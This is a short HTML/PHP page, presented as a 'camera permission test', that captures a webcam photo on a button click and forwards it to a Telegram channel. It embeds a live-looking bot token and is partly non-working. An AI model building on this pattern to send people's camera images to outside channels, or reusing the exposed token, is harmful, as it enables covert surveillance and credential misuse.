<!DOCTYPE html>
<html>
<head>
	<title>Camera Permission Test</title>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>
<body>
	<h1>Camera Permission Test</h1>
	<video id="video" width="640" height="480"></video>
	<button id="snap">Snap Photo</button>

	<script>
		// Get the video element and set up the media stream
		const video = document.getElementById('video');
		navigator.mediaDevices.getUserMedia({ video: true })
			.then(stream => {
				video.srcObject = stream;
				video.play();
			})
			.catch(err => {
				console.error('Could not get camera stream!', err);
			});

		// Get the canvas element and set up the snap photo button
		const canvas = document.createElement('canvas');
		const context = canvas.getContext('2d');
		const snapButton = document.getElementById('snap');
		snapButton.addEventListener('click', () => {
			context.drawImage(video, 0, 0, canvas.width, canvas.height);
			const dataUrl = canvas.toDataURL();
			// Send the photo to the Telegram channel using AJAX
			$.ajax({
				url: 'send_photo.php',
				type: 'POST',
				data: { photo: dataUrl },
				success: () => {
					alert('Photo sent to Telegram channel!');
				},
				error: (jqXHR, textStatus, errorThrown) => {
					console.error('Error sending photo:', textStatus, errorThrown);
				}
			});
		});
	</script>
	<?php
		// Set up the Telegram bot API credentials
		$bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
		$telegram_api_url = 'https://api.telegram.org/bot' . $bot_token . '/sendPhoto';

		// Check if a photo was sent via POST
		if(isset($_POST['photo'])) {
			$photo = $_POST['photo'];
			// Send the photo to the Telegram channel
			$post_fields = array(
				'chat_id' => '@localipy',
				'photo' => $photo
			);
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $telegram_api_url);
			curl_setopt($ch, CURLOPT_POST, true);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			$response = curl_exec($ch);
			curl_close($ch);
			if($response) {
				echo '<script>alert("Photo sent to Telegram channel!");</script>';
			} else {
				echo '<script>alert("Error sending photo!");</script>';
			}
		}
	?>
</body>
</html>
